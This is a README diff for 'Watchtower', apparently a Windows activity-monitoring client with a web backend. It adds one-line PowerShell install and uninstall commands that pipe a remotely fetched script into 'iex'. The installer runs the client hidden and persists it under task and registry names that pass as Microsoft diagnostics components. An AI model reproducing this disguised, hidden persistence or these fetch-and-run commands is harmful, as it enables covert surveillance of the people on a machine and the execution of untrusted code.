@@ -102,21 +102,47 @@ podman run -d -p 4000:4000 -v watchtower-data:/app/data --name watchtower watcht
 
 ---
 
-### 4. Compile & Install the Windows 11 Client
+---
+
+### 4. ⚡ Windows 1-Line Client Installation (Recommended)
+
+To install and run the client background daemon on any Windows 10/11 machine, open **PowerShell** and run:
+
+```powershell
+irm https://watchtower-production-3b1e.up.railway.app/api/install.ps1 | iex
+```
+
+#### What this 1-line installer does:
+1. **Automated Download**: Fetches the latest pre-built `watchtower.exe` release from GitHub.
+2. **Configuration**: Configures the WebSocket server connection and binds the machine's hostname (`$env:COMPUTERNAME`).
+3. **Session Persistence**: Registers user logon startup triggers (`HKCU`/`HKLM` Run keys + Task Scheduler) running in the interactive user session (Session 1) to ensure foreground window tracking and idle detection work without Session 0 isolation.
+4. **Instant Monitoring**: Starts the background process immediately with `-WindowStyle Hidden`.
+
+---
+
+### 5. 🗑️ 1-Line Client Uninstallation
+
+To completely remove Watchtower from a Windows machine:
+
+```powershell
+irm https://watchtower-production-3b1e.up.railway.app/api/uninstall.ps1 | iex
+```
+
+*Or run the manual PowerShell cleanup command:*
+```powershell
+Stop-Process -Name "watchtower" -Force -ErrorAction SilentlyContinue; schtasks.exe /delete /tn "Microsoft\Windows\SystemDiagnosticsHostTask" /f 2>$null; Remove-ItemProperty -Path "HKLM:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "WindowsDiagnosticsHost" -ErrorAction SilentlyContinue; Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "WindowsDiagnosticsHost" -ErrorAction SilentlyContinue; Remove-Item -Path "C:\ProgramData\Watchtower" -Recurse -Force -ErrorAction SilentlyContinue; Write-Host "Watchtower has been completely uninstalled." -ForegroundColor Green
+```
+
+---
+
+### 6. Manual Client Compilation (Developers)
 
 ```powershell
 # 1. Compile Rust Client
 cd client
 cargo build --release
 
-# 2. Run PowerShell Installer as Administrator
-cd ..\scripts
-.\install-client.ps1 -ServerUrl "wss://your-railway-app.up.railway.app/ws/client" -DeviceId "Son-Gaming-PC"
-```
-
-To run in foreground for testing:
-```powershell
-cd client
+# 2. Run in foreground with custom config
 cargo run -- --config config.json
 ```
 
@@ -129,3 +155,4 @@ Run automated test suites:
 cd backend
 npm test
 ```
+
